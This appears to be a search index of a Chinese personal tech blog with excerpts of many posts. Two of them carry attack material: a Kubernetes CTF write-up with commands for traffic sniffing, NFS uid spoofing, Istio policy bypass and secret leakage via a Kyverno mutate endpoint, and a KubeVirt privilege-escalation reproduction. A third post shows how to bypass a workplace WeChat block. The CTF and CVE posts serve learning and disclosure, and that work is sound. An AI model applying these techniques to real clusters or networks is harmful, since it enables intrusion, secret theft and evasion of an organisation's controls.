<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>终端工具集(2024)</title><url>/posts/tech-dev-2024/</url><categories/><tags/><content type="html"><![CDATA[   声明: 此项目与那些声称要取代vscode等GUI工具的配置不同, 而是力图填补这些大型开发工具在终端环境下的空白
项目地址: https://github.com/ch3n9w/dev , 后续README更新不会同步到这篇博客, 但是大体上秉承的思想不会改变: 极简、可用以及最少化心智负担
Development Toolkit 📡 A comprehensive and user-friendly development toolkit to boost up your productivity 🚀.
terminal emulator: kitty shell: zsh editor: neovim terminal filemanager: lf multiplexers: tmux or kitty Try docker run -it --rm --name dev ch4xer/dev:latest /bin/zsh Install git clone https://github.com/ch3n9w/dev cd dev # install dependency software and install configuration ./scripts/install-software.sh Alternatively (if you dont want to install all of them), you can copy the configuration directory you like to XDG_CONFIG_HOME (commonly ~/.config), for example:
nvim -&gt; ~/.config/nvim kitty -&gt; ~/.config/kitty tmux -&gt; ~/.config/tmux lf -&gt; ~/.config/lf zsh/zsh -&gt; ~/.config/zsh zsh/zshrc -&gt; ~/.zshrc starship/starship.toml -&gt; ~/.config/starship.toml Noteable Info Kitty use Ctrl and Shift as modifier key for all shortcuts use JetbrainMono Nerd Font and LXGW WenKai as font Tmux use Alt and Ctrl as modifier key for all shortcuts set Alt-a as prefix key instead of Ctrl-b use tmux-continuum and resurrect to restore sessions. Zsh you can add software settings in zsh/zsh/software disable vim mode. Neovim Only use &lt;=30 plugins to make Neovim tiny and good enough for editing Keymap Software Key Effect kitty C-t new tab kitty C-CR new window kitty C-w delete window kitty C-h/j/k/l focus other window kitty C-S-h/j/k/l move window kitty C-PgUp/PgDn goto other tab kitty C-S-PgUp/PgDn move tab kitty C-=/- adjust font size kitty f1 search content kitty f11 toggle zoom zsh C-r execute lf filemanager zsh C-e open filemanager-gui zsh C-Backspace delete word backward lf gh go to home (~) lf gd go to ~/Documents lf gn go to ~/Downloads lf H/L go to previous/next visited directory lf a mkdir lf t touch lf r rename file or directory lf o open with custom software lf . show hidden file lf ; execute shell command lf y copy lf d cut lf p paste lf D move to trash lf Delete rm lf f fuzzy search using fzf tmux M-a prefix key tmux M-h/j/k/l go to other pane tmux M-q kill pane tmux M-C-j/k swap with other panes tmux M-x split window horizontally tmux M-C-x split window vertically tmux M-f toggle zoom tmux M-t create new window tmux M-C-t rename window tmux M-PgUp/PgDn go to previous/next window tmux M-C-PgUp/PgDn swap with previous/next window tmux M-s choose session tmux M-C-s rename session tmux M-n create new session neovim q quit window/neovim neovim Q record macro neovim H/L go to the begin/end of line neovim Tab move to other window neovim ; enter commandline mode neovim g= format document neovim 2-LeftMouse/CR toggle fold neovim sw fuzzy search word neovim sf fuzzy search filename neovim z fuzzy search opened buffers neovim ga (lsp) code action neovim ge (lsp) show diagnostics in line neovim gh (lsp) get document neovim gn (lsp) rename symbol neovim gd (lsp) go to definition neovim gr (lsp) find reference neovim C-/ comment line neovim f flash jump neovim Tab/S-Tab code completions neovim t File Tree   ]]></content></entry><entry><title>《如何阅读一本书》读书笔记</title><url>/posts/read-how-to-read-a-book/</url><categories/><tags/><content type="html"><![CDATA[  这本书主要介绍了在进行以提升理解力为目的的阅读时所应该掌握的技巧, 这些技巧可以帮助提升阅读的效率, 节约时间的同时抓住重点. 注意, 这些技巧并不会让阅读变得更轻松, 相反, 读者消耗的精力可能会更多, 因为这些技巧要求读者更多地发挥其主动性, 然而, 这些技巧能够帮助读者更好地提升自己的理解力和知识吸收的速度, 并且有针对性地运用有限的精力.
本书并不谈论以消遣为目的的阅读活动, 也不会谈论单纯以获取资讯为目的的阅读活动, 尽管在提升理解力后, 获取资讯会更加迅速.
四个层次的阅读 阅读的四个层次, 这几个层次是相互包含, 层层递进的:
基础阅读: 熟悉理解并掌握词语和句子的意思 检视阅读: 在规定时间内从宏观层面上理解书中的重点, 从而判断值不值得读 系统性略读 阅读书名 序言 目录 从目录中挑几个与主题相关的篇章, 仔细阅读开头和结尾处的摘要说明 随便翻翻全书, 随时寻找主要论点, 不要忽略最后的两三页 粗浅阅读 从头到尾先读完一遍, 碰到不懂的地方不要停下来查询或思考, 只注意你能理解的地方, 不要为了一些没能立刻理解的地方而停顿, 这样就不会拘泥于局部 克服在🧠大脑中念出声的阅读方式, 头脑和眼睛不一样, 并不需要一次只&amp;quot;读&amp;quot;一个字或者句子 =&amp;gt; 利用手指在书页上的移动来引导眼睛和大脑 分析阅读: 全盘完整的阅读 (不完全适用于小说和诗集) 阶段一 为书籍分类(小说?爱情小说?论说类?经济学?历史?哲学?) =&amp;gt; 什么类型的房子 用几句话叙述整本书的内容 =&amp;gt; 房子的整体功能(整体性) 将重要篇章列举出来, 说明它们如何形成了整体 =&amp;gt; 砖瓦的功能和联系(复杂性) 阶段二 找出关键字, 确认每个字不同意义之间的转换, 与作者找出共通的语义 重新架构作者论述的前因后果 确定作者解决了什么问题, 还有哪些问题没有解决 阶段三: 对书本下评论 主题阅读: 面对一本书时去阅读许多同类型的其他书籍, 并相互对比 针对主题设计实验性书目, 找出并确定相关的书籍 阅读这些书籍的相关章节 建立中立的主旨和词汇, 列出一连串相关的问题 界定每个作者研究的主要和次要议题 分析这些讨论。这得把问题和议题按顺序排列，以求突显主题 所谓阅读速度, 不只是要能读得快, 还要能用不同的速度来阅读, 要知道什么时候用什么速度是恰当的.
读者的 …  ]]></content></entry><entry><title>《高效原力》读书笔记</title><url>/posts/read-feel-good-productivity/</url><categories/><tags/><content type="html">  这本书主要讨论了如何在工作过程中保持愉悦的心态, 进而提升工作效率, 保护精神健康. 作者认为愉悦心态可以帮助克服焦虑和过度的压力, 成功不会让你感觉愉悦, 但是感觉愉悦会为你带来成功.
本书内容分为三个部分: 激励(让工作更有兴致) 解锁(消除面对工作时的负面情绪) 续航(通过良好的习惯克服倦怠感)
激励 游戏化思维 有趣的游戏化体验会带来愉悦
选择一个游戏性格, 找出最能与你产生共鸣的游戏状态, 并有意识的把自己当作这个角色来对待工作, 代入一场冒险
收藏家：喜欢收集和整理物品，喜欢寻找珍稀植物、拍卖档案馆或车库中的珍宝等活动。 竞争者：喜欢游戏和体育赛事，以全力以赴和获胜为乐。 探索者：喜欢徒步旅行、公路旅行和其他探索活动，喜欢行走和发现新的地方和从未见过的事物。 创造者：在创造中找到快乐，每天可以花几个小时涂鸭、绘画、制作音乐、园艺等。 讲故事的人：想象力丰富，能用自己的想象力取悦他人。他们喜欢写作、舞蹈、戏剧和角色扮演。 小丑：努力逗人发笑，可能会通过倒立、即兴表演或恶作剧逗你发笑。 导演：喜欢策划、组织和领导他人，能胜任各种角色和活动，从导演舞台剧到管理公司，再到参与政治或社会运动。 动觉型： 在杂技、体操和自由跑等体育活动中找到乐趣。 善于运用好奇的力量, 当被问到让人好奇的问题的时候, 大脑会开始分泌多巴胺, 更让人专注
工作时候多问问自己问题 每天除了日常任务之外给自己增加一个让人好奇的支线任务: 探索新的软件 学习新的编程语言 学习新的模型, 给玩心创造空间 多问问自己, 怎么样能让这个任务变得更加有趣? 要更加专注于任务过程带来的乐趣, 而不是结果.
压力会降低游戏的能力, 也会降低生产力, 这意味着为了激发玩心, 我们不只需要追求冒险和寻找乐趣, 还需要努力创造一个低风险能让人放松的环境
学习黑暗之魂的思路去看待失败, 将失败看作是冒险中不可分割的一部分, 是尝试新事物的实验, 是成功路上的必经之路, 是隐形的进步
多提醒提醒自己, 不要过于严肃, 而是真诚以对
好比玩一场大富翁游戏, 无所谓的心态自然无法玩好, 过于严肃对得失斤斤计较则无论过程是否顺利都体会不到乐趣, 只有真诚对待游戏, 全心投入每一个过程却又不计较得失, 才能开怀大笑. (很重要)
自我赋权 自信心会给工作过程带来快乐, 让人表现更好
对于人类的表现和福祉而言, 重要的不 …  </content></entry><entry><title>特殊网络环境下的微信代理</title><url>/posts/tech-wechat-proxy/</url><categories><category>技术</category></categories><tags/><content type="html">  目前单位实施了微信封锁,本文旨在记录绕过封锁的过程.
阶段一: 抓域名 使用了tcpdump抓取各个dns请求, 来获取需要代理的域名列表
sudo tcpdump -i any -n -s 0 port 53 但是抓到域名后加入daed的代理列表中还是无法登陆,怀疑是没抓全.
阶段二: 进程代理 既然抓不全, 那么就对整个微信的进程进行流量代理吧, 在daed中添加规则:
pname(WeChatAppEx) -&amp;gt; proxy pname(wechat) -&amp;gt; proxy 这下登陆和发文字消息都正常了, 但是图片的发送和接收有极其严重的延迟, 应该是走了代理导致的.
阶段三: 仅代理登陆相关域名 经过几次实验, 发送单位对微信的封禁主要有两方面:
登陆相关的流量封禁 微信公众号图片相关的流量封禁 那么在搜索到 相关域名列表 之后,将对应的域名添加到daed规则中,其他的流量不作处理使用直连.
domain(keyword:login.weixin,keyword:open.weixin,keyword:mp.weixin,keyword:qpic) -&amp;gt; proxy 重新加载规则, 一切正常.
  </content></entry><entry><title>卡牌迷思：从万智牌的衰退开始</title><url>/posts/gossip-tcg/</url><categories/><tags/><content type="html"><![CDATA[  这几天被万智牌所吸引, 富有史诗感的画风, 复杂但不混乱的规则, 简洁的卡面语言, 丰富的卡片种类, 多样性的玩法&amp;hellip;&amp;hellip;这些都是我在游戏王中所接触不到但怀念许久的, 在接触万智牌之前,这种怀念源自于过去的炉石传说,而在了解到万智牌后才发现,这些特质其实是万智牌所创造而让炉石继承下来的, 再加上略倾向于黑暗史诗的画风, 万智牌在很多维度上都比过去接触过的所有卡牌游戏更戳我的xp.
当然, 它并不是没有缺点的, 虽然主要的几个缺点都不是卡牌本身带来的.
最大的缺点其实在于威世智的运营太垃圾了 缺乏推广, 国内的推广力度相比较宝可梦来说几乎为0, 我目前能看到的最近的一次推广还是在2021年, 找的甚至还是半佛而不是正儿八经的明星 官方对民间赛事的抵制态度让&amp;quot;积极组织-&amp;gt;积极阻止&amp;quot;成为大陆万智牌玩家口口相传的黑历史, 失去了民心 取消中文线不仅妨碍的新人入坑, 也让老玩家对买卡的投资价值产生了怀疑, 继而推动这两类人去投资其他发展更有前景的卡牌 万智牌的定价, 四美元十五抽的全球统一定价在三十年的万智牌历史中就没有变过, 可即便在消费水平远胜过去的现在, 这个价格在大部分人, 尤其是圈外玩家看来依旧偏高, 再加上至少60牌的构筑体量和二级市场交易, 让成型万智套牌的价格普遍在500+, 与之形成鲜明对比的, 是宝可梦和游戏王等TCG后辈们更加亲民的价格, 让万智牌显得像是一个跟不上时代的老人. 当然了, 就我个人而言, 万智牌的设计感值得让它的价格比别的卡牌贵, 虽然我不会买 背景故事质量不高. 人类是一个以讲故事起家的物种, 人类社会也是在金钱政治国家宗教等种种抽象故事基础上建立起来的, 可以说没有故事就没有社群. 万智牌不是没有故事, 而是它的故事太过单薄且没有吸引人的地方, 在这个故事遍地走的年代, 随便一本主流的冒险小说都可以拉出来吊打它, 而不够精彩的故事就注定无法吸引注重故事的人 缺乏故事的传播媒介. 客观来说, 游戏王和宝可梦的背景故事放在现在来看同样水平一般, 假如大家的故事形式都只是小说, 我相信万智牌在讲故事这方面或许还有一战之力, 但是游戏王和宝可梦有了动画, 竞争的维度就变得不一样了, 在处理得当的情况下, 视频影像会大幅度提高一个故事情感渲染的上下限, 即便剧情再怎么糟糕, 人们也会因为那么几个 …  ]]></content></entry><entry><title>Kubernetes Admission Webhook 部署和调试</title><url>/posts/tech-kubernetes-webhook/</url><categories><category>技术</category></categories><tags/><content type="html">  Deployment and Debugging of Admission Webhook in Kubernetes cluster Intro Dynamic admission control 允许开发者添加自己的逻辑代码来对提交给API Server的对象进行修改和验证, 是非常强大的功能. 本文将部署一组demo admission webhook, 包括一个validating webhook 和一个 mutating webhook, 并介绍webhook的调试方法. 本文主要使用和参考了 从0到1开发K8S_Webhook最佳实践 , 并通过查阅官方文档对其中的一些不适应新版本k8s的内容进行了修正.
本文使用的集群环境为Kubernetes v1.25.16, 使用minikube创建. 我所在的机器为Arch Linux. 代码仓库为 admission-webhook-example 中的v1部分.
在开始之前, 请确保集群的API Server开启了MutatingAdmissionWebhook和ValidatingAdmissionWebhook (一般默认情况下都开启了).
Deployment 创建 service account 创建一个用于webhook的service account
kubectl apply -f deployment/rbac.yaml 创建证书 API Server调用Webhook的过程是需要HTTPS通信的(其实集群内的通信几乎都是HTTPS), 因此需要为webhook创建证书来对webhook的service进行域名认证. 原博客使用的webhook-create-signed-cert.sh已经过时, 不再适用于1.25.16版本的集群了, 主要出问题的地方如下:
# create server cert/key CSR and send to k8s API cat &amp;amp;lt;&amp;amp;lt;EOF | kubectl create -f - apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: ${csrName} spec: groups: - …  </content></entry><entry><title>CVE-2023-26484 Kubevirt 权限提升漏洞复现</title><url>/posts/sec-cve-2023-26484/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[  该漏洞是论文工作 &amp;ldquo;Take Over the Whole Cluster: Attacking Kubernetes via Excessive Permissions of Third-party Applications&amp;rdquo; 挖掘到的, 对其进行复现可以更好地理解rbac的潜在风险.
CVE-2023-26484 Kubevirt 权限提升漏洞 简介 KubeVirt 是 Kubernetes 的虚拟机管理插件. 在 0.59.0 及之前的版本中, 如果恶意用户接管了运行 virt-handler 的 Kubernetes 节点, 则 virt-handler 服务账户可用于修改所有节点.这可被滥用于诱骗系统级特权组件. 这样, 被入侵的节点就可以被用来提升节点之外的权限, 直到可能拥有对整个集群的完全权限访问. 一旦用户可以入侵特定节点, 最简单的利用方法就是使用 virt-handler 服务账户将所有其他节点设置为不可调度, 然后等待具有高权限的系统关键组件出现在其节点上.
环境搭建 参考kubevirt的官网安装
export VERSION=&amp;#34;v0.59.0&amp;#34; kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-operator.yaml kubectl create -f https://github.com/kubevirt/kubevirt/releases/download/${VERSION}/kubevirt-cr.yaml 复现 从简介中就可以对这个漏洞的作用机理有一个大概的了解, 那么复现的步骤大致分为以下步骤:
获取一个节点的权限, 上面有virt-handler, 由于virt-handler是Daemonsets资源, 因此一定存在 拿到virt-handler的SA Token, 然后向API Server发送请求去 patch 其他节点, 让新创建的容器无法被调度到这些节点上 删除其他节点上的高权限pod, 在这个漏洞中, 我们可以利用virt-operator pod, 它的cluster role具有list 和 get secret的权限 等待高权 …  ]]></content></entry><entry><title>若为自由故, 软件皆可抛</title><url>/posts/read-free-opensource/</url><categories><category>阅读</category></categories><tags/><content type="html"><![CDATA[  借着&amp;quot;若为自由故&amp;quot;这本书, 读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用&amp;quot;Open-source&amp;quot;而不是&amp;quot;Free&amp;quot;这个词, 不仅能够直观清晰地表达信息, 也能避免&amp;quot;Free&amp;quot;这个单词常用的&amp;quot;免费&amp;quot;之意 (为了人们认识到&amp;quot;Free software&amp;quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.
具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以&amp;quot;人的自由&amp;quot;为中心, 任何限制软件用户这些权利的个人和组织都是&amp;quot;邪恶&amp;quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: &amp;ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它&amp;rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.
两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.
在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知 …  ]]></content></entry><entry><title>k8s lan party</title><url>/posts/ctf-k8s-lan-party/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  Long time no CTF~~
RECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan
This blog is good written link Finding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.
As we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.
tcpdump -i any host reporting-service.k8s-lan-party.svc.cluster.local and tcp -w traffic.pcap and the flag was in the traffic.pcap
DATA LEAKAGE The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.
At first glance, I thought the data storage is nfs, and found the existence of /efs/flag.txt. However, there is no enough permission to read it, while I failed to mount the remote storage to local host, so I stopped and didn&rsquo;t have any progress until the end of the game.
By executing mount, here we got:
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.30.72,local_lock=none,addr=192.168.124.98) Since the remote storage use nfs4, we should specify the version when listing it.
nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4 try to cat the remote flag.txt, but there is no enough permission.
nfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4 However, according to the libnfs document, we could spoof uid and gid by adding parameters to the nfs url and get elevated privileges.
nfs-cat &#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&amp;gid=0&#34; The Beauty and The Ist Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&rsquo;t abuse this power; use it responsibly and with caution.
The given policy is
apiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: istio-get-flag namespace: k8s-lan-party spec: action: DENY selector: matchLabels: app: &#34;{flag-pod-name}&#34; rules: - from: - source: namespaces: [&#34;k8s-lan-party&#34;] to: - operation: methods: [&#34;POST&#34;, &#34;GET&#34;] The policy in this challenge block GET and POST requests from namespace k8s-lan-party Find Istio service
dnscan -subnet 10.100.0.1/16 The request to this address will be denied. However, there seems to be user that can bypass the Istio&rsquo;s IPTables rules from hist#2.
cat /etc/passwd | grep 1337
And we got user istio, According to ncc report and Istio Iptables , the 1337 uid is used to distinguish between traffic originating from proxy vs the applications, which means we can bypass the policy restriction by switching to user istio and send requests, which would be recognized as traffic from istio sidercar proxy.
Who will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.
The given policy:
apiVersion: kyverno.io/v1 kind: Policy metadata: name: apply-flag-to-env namespace: sensitive-ns spec: rules: - name: inject-env-vars match: resources: kinds: - Pod mutate: patchStrategicMerge: spec: containers: - name: &#34;*&#34; env: - name: FLAG value: &#34;{flag}&#34; Kyverno is designed for policy management. The policy will inject flag into Pod resource created under sensitive-ns.
According to GPT, AdmissionReview is a kind of API resource used in admission control process. K8s supports two types of admission control webhooks to handle AdmissionReview: ValidatingAdmissionWebhook and MutatingAdmissionWebhook, the latter is called before validating object correctness, it can modify objects in the request, while the former is called after all MutatingAdmissionWebhook to check the state of the object for validity but does not modify it.
Obviously, the policy facilitates MutatingAdmissionWebhook to modify object.
Reconnoiter services first:
10.100.86.210 -&gt; kyverno-cleanup-controller.kyverno.svc.cluster.local. 10.100.217.223 -&gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local. 10.100.232.19 -&gt; kyverno-svc.kyverno.svc.cluster.local. 10.100.126.98 -&gt; kyverno-svc-metrics.kyverno.svc.cluster.local. 10.100.158.213 -&gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local. 10.100.171.174 -&gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local. What if we can utilize the MutatingAdmissionWebhook to steal the secret since we can access to https://kyverno-svc.kyverno.svc.cluster.local/mutate? The AdmissionReview requests to this api will be responsed by object modified by the kyverno, which makes a lot sense.
use the following resource to generate AdmissionReview
apiVersion: v1 kind: Pod metadata: name: curl-flag namespace: sensitive-ns spec: containers: - name: curl-container image: curlimages/curl ./kube-review create pod.yaml &gt; pod.json curl -k -X POST \ https://kyverno-svc.kyverno.svc.cluster.local/mutate \ -H &#39;content-type: application/json&#39; \ --data-binary &#34;@pod.json&#34; We got:
{&#34;kind&#34;:&#34;AdmissionReview&#34;,&#34;apiVersion&#34;:&#34;admission.k8s.io/v1&#34;,&#34;request&#34;:{&#34;uid&#34;:&#34;dd916513-9b96-4220-ae2b-b21470612d69&#34;,&#34;kind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;resource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;requestKind&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;kind&#34;:&#34;Pod&#34;},&#34;requestResource&#34;:{&#34;group&#34;:&#34;&#34;,&#34;version&#34;:&#34;v1&#34;,&#34;resource&#34;:&#34;pods&#34;},&#34;name&#34;:&#34;curl-flag&#34;,&#34;namespace&#34;:&#34;sensitive-ns&#34;,&#34;operation&#34;:&#34;CREATE&#34;,&#34;userInfo&#34;:{&#34;username&#34;:&#34;kube-review&#34;,&#34;uid&#34;:&#34;ee8332cb-afa6-412e-b60a-641f23d28980&#34;},&#34;object&#34;:{&#34;kind&#34;:&#34;Pod&#34;,&#34;apiVersion&#34;:&#34;v1&#34;,&#34;metadata&#34;:{&#34;name&#34;:&#34;curl-flag&#34;,&#34;namespace&#34;:&#34;sensitive-ns&#34;,&#34;creationTimestamp&#34;:null},&#34;spec&#34;:{&#34;containers&#34;:[{&#34;name&#34;:&#34;curl-container&#34;,&#34;image&#34;:&#34;curlimages/curl&#34;,&#34;resources&#34;:{}}]},&#34;status&#34;:{}},&#34;oldObject&#34;:null,&#34;dryRun&#34;:true,&#34;options&#34;:{&#34;kind&#34;:&#34;CreateOptions&#34;,&#34;apiVersion&#34;:&#34;meta.k8s.io/v1&#34;}},&#34;response&#34;:{&#34;uid&#34;:&#34;dd916513-9b96-4220-ae2b-b21470612d69&#34;,&#34;allowed&#34;:true,&#34;patch&#34;:&#34;W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d&#34;,&#34;patchType&#34;:&#34;JSONPatch&#34;}}   ]]></content></entry><entry><title>2023年度总结</title><url>/posts/gossip-2023-summary/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   一事无成的一年, 但也算有所收获, 如果教训也算收获的话.
2023年给我的感觉是快, 太快了, 兴许是疫情后的这一年里人们积攒许久的劳动热情终于得到了释放, 正式回所的自己也体会到了这种快节奏的生活. 然而自己其实并不能很好的适应, 本科毕业后, 疫情成为了很多事情都不必去做的接口, 渐渐的, 我在这种消极的氛围中变得越来越懒惰. 而今年, 正是充满教训的一年. 除去那些或偶然或侥幸而得的小便宜, 今年的自己可谓是一事无成, 因此, 这篇文章与其是年度总结, 不如说是一篇年度的检讨文.
缺乏沟通, 闭门造车 这是今年论文进度缓慢的最直接原因, 早在今年年初的时候, 我就有了论文的想法, 但是在没有和师兄与导师充分沟通的情况下只顾自己埋头做, 天马行空的设想和飘忽不定的点子让自己常常东打一棍西打一耙. 结果慢慢悠悠到了八月份的时候导师和我沟通的时候, 只用了几句话就让我汗流浃背, 茅塞顿开, 自己原来在不重要的事情上浪费了这么多的时间和精力! 其实现在想来, 自己闭门造车回避交流的深度心理原因, 也是对自己不自信导致的, 然而回避不能解决问题, 只能解决让问题恶化.
有鉴于此, 在下一年中, 我必须积极和师兄导师沟通交流分享自己的想法, 当我认识到自己表露出了害羞和回避的心理的时候, 我需要调用自己的理性来克服弱点, 驱动自己向前迈步.
沉迷配置和游戏, 在无意义的事情上浪费了太多心智 在讨论这点之前, 首先需要明确一下, 比起时间, 我更关注精力的管理. 如果说缺乏沟通是让我在利用精力的战略大方向上出现了偏差, 那么沉迷配置与游戏就是就是战术上的失败. 游戏自不必说, 本来就是消磨精力的发明, 而现代的游戏产业为了迎合越来越多年轻人无处发泄的精力, 研究出了各种令人精疲力尽眼花缭乱的玩法, 着实可怕, 而这其中我今年接触的偏偏是最耗费个人精力的两类游戏: 战旗类(明日方舟) 和 卡牌类(游戏王), 前者消耗精力的程度还不算很多, 因为我也无心深入游玩, 但后者不仅仅是精力杀手, 还是一个无止尽的时间黑洞: 无论是组建卡组还是接触对决过程中遇到的新卡组, 我都需要逼迫自己去阅读晦涩无趣的文本, 更不用说双方回合中的等待时间了.
那么玩配置又是怎么一回事? 难道对生产力工具进行改良也是不对的吗? 并不是, 适当的配置的确有助于提升生产过程中的体验, 但问题是, 一旦 …  </content></entry><entry><title>Learning eBPF</title><url>/posts/tech-learning-ebpf/</url><categories><category>技术</category></categories><tags/><content type="html">  eBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.
对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.
Background and pre-knowledge bcc bcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.
limitation of ebpf program eBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令； eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数； eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储； 在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条； 由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。 tracepoint and kprobe tracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.
Tracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数
eBPF virtual machine The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is …  </content></entry><entry><title>RIP Clash</title><url>/posts/gossip-rip-clash/</url><categories><category>碎碎念</category></categories><tags/><content type="html">  2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.
起因 事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.
如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.
但是事情没有那么简单.
clash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.
通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.
因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.
假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.
前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.
于是事情失控了.
